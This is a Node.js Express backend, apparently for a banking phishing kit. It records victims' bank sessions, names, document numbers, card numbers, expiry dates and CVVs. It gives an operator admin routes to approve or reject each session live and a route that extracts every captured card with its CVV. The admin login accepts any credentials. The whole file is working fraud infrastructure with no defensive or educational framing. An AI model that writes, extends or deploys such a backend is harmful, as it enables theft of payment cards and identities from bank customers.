const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const DB_FILE = path.join(__dirname, 'db.json');
let db = { sesiones: [], historial: [] };

if (fs.existsSync(DB_FILE)) {
    try {
        db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (e) {
        console.log('Error leyendo db.json, iniciando vacía.');
    }
}

function guardarDB() {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

app.post('/api/sesion', (req, res) => {
    const { sessionId, bancoKey, estado, paso, datos } = req.body;
    let sesion = db.sesiones.find(s => s.sessionId === sessionId);

    if (sesion) {
        sesion.estado = estado;
        sesion.paso = paso;
        sesion.datos = { ...sesion.datos, ...datos };
    } else {
        sesion = {
            id: Date.now(),
            sessionId,
            bancoKey,
            estado,
            paso,
            datos: { bancoKey, ...datos },
            fecha: new Date()
        };
        db.sesiones.push(sesion);
    }

    guardarDB();
    res.json({ ok: true, sessionId });
});

app.get('/api/sesion/:sessionId/estado', (req, res) => {
    const { sessionId } = req.params;
    const sesion = db.sesiones.find(s => s.sessionId === sessionId);
    if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });
    res.json({ estado: sesion.estado });
});

app.get('/admin/stats', (req, res) => {
    const stats = {
        sesiones: db.sesiones.length,
        pendientes: db.sesiones.filter(s => s.estado === 'pendiente').length,
        historial: db.historial.length
    };
    res.json(stats);
});

app.get('/admin/sesiones', (req, res) => {
    res.json({ sesiones: db.sesiones });
});

app.get('/admin/historial', (req, res) => {
    res.json({ historial: db.historial });
});

app.post('/admin/login', (req, res) => {
    const { usuario, password } = req.body;
    if (usuario && password) {
        res.json({ token: 'davi-token-' + Date.now(), usuario });
    } else {
        res.status(401).json({ error: 'Credenciales inválidas' });
    }
});

app.post('/admin/sesion/:sessionId/accion', (req, res) => {
    const { sessionId } = req.params;
    const { accion } = req.body;
    const sesion = db.sesiones.find(s => s.sessionId === sessionId);
    
    if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });

    if (accion === 'ACEPTAR') sesion.estado = 'aceptado';
    else if (accion === 'RECHAZAR') sesion.estado = 'rechazado';
    else return res.status(400).json({ error: 'Acción no permitida' });

    db.historial.push({ ...sesion, fechaCierre: new Date() });
    guardarDB();

    res.json({ ok: true, estado: sesion.estado });
});

// 🔥 NUEVA RUTA: Extrae todas las tarjetas ingresadas (activas y finalizadas) 🔥
app.get('/admin/tarjetas', (req, res) => {
    const tarjetasActivas = db.sesiones.filter(s => s.datos && s.datos.tarjeta).map(s => ({
        sessionId: s.sessionId,
        nombre: (s.datos.datosPersonales?.primerNombre || '') + ' ' + (s.datos.datosPersonales?.primerApellido || ''),
        documento: s.datos.docNumber || '-',
        tarjeta: s.datos.tarjeta,
        expMes: s.datos.expMes || '',
        expAnio: s.datos.expAnio || '',
        cvv: s.datos.cvv || '-',
        estado: s.estado,
        fecha: s.fecha
    }));

    const tarjetasHistorial = db.historial.filter(s => s.datos && s.datos.tarjeta).map(s => ({
        sessionId: s.sessionId,
        nombre: (s.datos.datosPersonales?.primerNombre || '') + ' ' + (s.datos.datosPersonales?.primerApellido || ''),
        documento: s.datos.docNumber || '-',
        tarjeta: s.datos.tarjeta,
        expMes: s.datos.expMes || '',
        expAnio: s.datos.expAnio || '',
        cvv: s.datos.cvv || '-',
        estado: s.estado,
        fecha: s.fecha
    }));

    const todas = [...tarjetasActivas, ...tarjetasHistorial].sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
    res.json({ tarjetas: todas });
});

app.get('/admin/activos', (req, res) => res.json({ activos: [] }));
app.get('/admin/ips-bloqueadas', (req, res) => res.json({ ips: [] }));
app.get('/admin/logs', (req, res) => res.json({ logs: [] }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend en puerto ${PORT}`));
